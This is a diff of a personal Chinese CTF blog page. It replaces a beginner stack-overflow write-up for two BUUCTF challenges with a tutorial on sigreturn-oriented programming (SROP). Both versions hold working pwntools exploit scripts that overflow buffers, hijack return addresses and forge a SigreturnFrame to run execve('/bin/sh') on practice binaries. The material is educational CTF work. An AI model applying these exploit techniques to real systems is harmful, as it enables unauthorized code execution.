@@ -13,7 +13,7 @@
 
 
 
-<title>对栈溢出的个人见解 | Mr.BW的妙妙屋</title>
+<title>srop | Mr.BW的妙妙屋</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">对栈溢出的个人见解</h1>
+            <h1 class="post-title">srop</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">五月 12, 2024&nbsp;&nbsp;21:59:19</a>
+                        Date: <a href="#">七月 31, 2024&nbsp;&nbsp;9:33:57</a>
                         </span>
                     
                     
@@ -221,40 +221,39 @@
         </header>
 
         <div class="post-content">
-            <h5 id="叠个甲"><a href="#叠个甲" class="headerlink" title="叠个甲"></a>叠个甲</h5><p>新手pwner一枚，若出现描述错误，理论错误，或题解错误等欢迎指正</p>
-<h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h3><p>栈溢出是指在有限栈空间内存入过大的数据，导致溢出的数据可能会覆盖掉栈空间以外的数据，导致代码执行出错，或泄露受保护的信息等。对于输入时若不进行输入检查，则极易容易造成栈溢出，常见的栈溢出可能发生在<code>gets()</code><code>read()</code>等输入函数。因此做题时注意这些函数的出现。</p>
-<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>题目来源：[buuctf](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a>)</p>
-<h4 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h4><p>下载后拖入ida中 </p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/1.png" alt="1"></p>
-<p>nc后直接得到shell</p>
-<h4 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h4><p>拖入ida后查看main 发现<code>gets(s,argv) </code>  控制在此处的输入发生栈溢出。</p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/2.png" alt="2"></p>
-<p>检查数组s</p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/3.png" alt="3"></p>
-<p>大小为0XF字节，再加上8个字节的偏移量控制返回，之后在检查后门函数。</p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/4.png" alt="4"></p>
-<p>发现后门函数，只要控制函数在0X40118A处返回即可得到shell</p>
-<p><em><strong>exp:</strong></em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,27573)</span><br><span class="line"></span><br><span class="line">offset=b&#x27;a&#x27;*(0xF+8)+p64(0x40118A)</span><br><span class="line"></span><br><span class="line">r.sendline(offset)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+            <h1 id="srop介绍"><a href="#srop介绍" class="headerlink" title="srop介绍"></a>srop介绍</h1><p>当程序进行syscall系统调用是，程序会保存当前寄存器的状态，等到系统调用完成时，程序会恢复寄存器状态，而保存寄存器状态的这段内存叫做<strong>signal frame</strong></p>
+<p>系统调用完成后时通过执行<strong>sigreturn</strong>来恢复寄存器状态的</p>
+<p>signal frame是可读可写，因此我们可以改变signal frame里的寄存器状态伪造sigframe进而主动执行sigreturn从而控制每个寄存器</p>
+<p><img src="/../image/srop/2.png" alt="2"></p>
+<p>signal frame的结构 （来自ctf-wiki）</p>
+<h2 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h2><ol>
+<li><p>能够主动去系统调用sigreturn，控制rax的值使其对sigreturn系统调用（可以通过read的返回值控制rax）</p>
+</li>
+<li><p>知道binsh的地址，在栈上要泄露栈地址</p>
+</li>
+<li><p>有足够长的溢出空间能够写下signal frame</p>
+</li>
+<li><p>有syscall的地址能够跳转到此处</p>
+</li>
+</ol>
+<h2 id="pwntools进行srop"><a href="#pwntools进行srop" class="headerlink" title="pwntools进行srop"></a>pwntools进行srop</h2><p>pwntools中有伪造signal frame的工具</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">59</span></span><br><span class="line">sigframe.rdi = binsh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall_addr</span><br></pre></td></tr></table></figure>
 
+<p>利用SigreturnFrame()类来伪造signal frame 注意大小写</p>
+<p>此处伪造的是<code> execve(&#39;/bin/sh,0,0&#39;)</code></p>
+<p>没有赋值的寄存器值默认设置为0，注意设置好rip寄存器，使其执行完后直接跳转到syscall</p>
+<p>一次srop只能调用一次syscall</p>
+<p>若能想办法指向syscall ret 则可以控制rsp进行一系列的sigreturn调用</p>
+<p><img src="/../image/srop/1.png" alt="1"></p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>来源：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/133">CISCN 2019华南]PWN3 | NSSCTF</a></p>
+<p>64位nx保护，main直接调用vuln</p>
+<p><img src="/../image/srop/3.png" alt="3"></p>
+<p>一读一写，因此可以在劫持返回地址的同时泄露栈地址</p>
+<p>返回地址继续返回到vuln，第二次执行再写入binsh</p>
+<p><img src="/../image/srop/4.png" alt="4"></p>
+<p>程序中有个mov rax,0xf; ret因此可以直接在第二次执行vuln的时候返回地址劫持为此处就可以进行sigreturn的系统调用了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./ciscn_pwn3&#x27;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">rax_15 = <span class="number">0x4004DA</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">59</span></span><br><span class="line">sigframe.rdi = addr- <span class="number">0x140</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(rax_15) + p64(syscall) + <span class="built_in">bytes</span>(sigframe))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-
-<h4 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h4><p>老规矩，拖入ida</p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/5.png" alt="5"></p>
-<p>发现<code>gets(v5)</code>  检查v5大小 </p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/6.png" alt="6"></p>
-<p>0x40个字节，算上8个控制返回值的偏移量，在检查有无后门函数</p>
-<p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/7.png" alt="7"></p>
-<p>发现后门函数，控制函数返回到0x400611即可，与上题不同的是，本题跑通直接得到flag</p>
-<p><em><strong>exp:</strong></em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,26457)</span><br><span class="line"></span><br><span class="line">offset=b&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line"></span><br><span class="line">r.sendline(offset)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.找到可能会引发栈溢出的函数</p>
-<p>2.计算偏移量</p>
-<p>3.找到后门函数地址，以便得到shell or flag</p>
-<p>4.控制函数返回到后门函数的位置</p>
 
         </div>
 
@@ -282,10 +281,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/05/22/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8/">pwntools的使用</a>
             
-            
-            <a class="next" rel="next" href="/2024/05/11/hello-world/">Hello World</a>
+            <a class="next" rel="next" href="/2024/07/27/24%E9%9B%86%E8%AE%ADweek3/">24集训week3</a>
             
         </section>
 
